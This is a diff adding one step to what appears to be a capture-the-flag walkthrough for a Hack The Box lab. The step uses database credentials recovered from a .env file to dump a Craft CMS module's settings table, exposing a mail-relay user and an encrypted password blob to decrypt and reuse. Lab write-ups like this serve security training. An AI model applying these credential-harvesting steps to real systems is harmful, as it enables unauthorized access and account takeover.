@@ -1314,6 +1314,62 @@ Key findings:
 <br>
 </div>
 
+### 7.4 Pull the encrypted mail-relay credentials from the database
+
+**Why this step:** With DB credentials from `.env` (7.3), query the custom Miles module's settings table. The module stores a service account's credentials, and service-account passwords are a common reuse vector onto a real system user.
+
+**Command:**
+
+```bash
+mysql -u craftuser -p'<DB_PASS>' craft -e "show tables like '%htbairways%';"
+mysql -u craftuser -p'<DB_PASS>' craft -e "select name,value from htbairways_settings;"
+```
+
+**Breakdown:**
+
+|Component|Reasoning|
+|---|---|
+|`mysql -u craftuser -p'<DB_PASS>' craft`|Connect to the `craft` database as the user recovered from `.env`.|
+|`show tables like '%htbairways%'`|Confirm the custom module's settings table name rather than assuming it.|
+|`-e "select name,value from htbairways_settings;"`|Dump the module's stored settings, including the mail-relay account.|
+
+**Result (password blob scrubbed):**
+
+```
++--------------------------------+
+| Tables_in_craft (%htbairways%) |
++--------------------------------+
+| htbairways_settings            |
++--------------------------------+
+
++-------------------+-----------------------------------------------------+
+| name              | value                                               |
++-------------------+-----------------------------------------------------+
+| mailRelayPassword | <REDACTED_BASE64_ENCRYPTED_BLOB>                    |
+| mailRelayHost     | mail.htbairways.htb                                 |
+| mailRelayPort     | 587                                                 |
+| mailRelayUser     | aporter                                             |
++-------------------+-----------------------------------------------------+
+```
+
+**What this gives you:**
+
+Key findings:
+
+- Mail-relay username is **`aporter`**, a candidate real-system user.
+- `mailRelayPassword` is a base64-encoded, Craft-encrypted blob, not plaintext; it must be decrypted with the security key from `.env`.
+- `mailRelayHost` / `mailRelayPort` (`mail.htbairways.htb:587`) are SMTP settings, not directly useful for access.
+
+**Next:** Decrypt the blob using Craft's own security component (seeded with the `.env` security key) via the bundled `craft` CLI, avoiding any manual AES/HMAC reconstruction.
+<div align="center">
+<br>
+<br>
+※※※※※※※※※※※※※※※※※※※※※※※※
+<br>
+<br>
+<br>
+</div>
+
 
 <div align="center">
 <br>
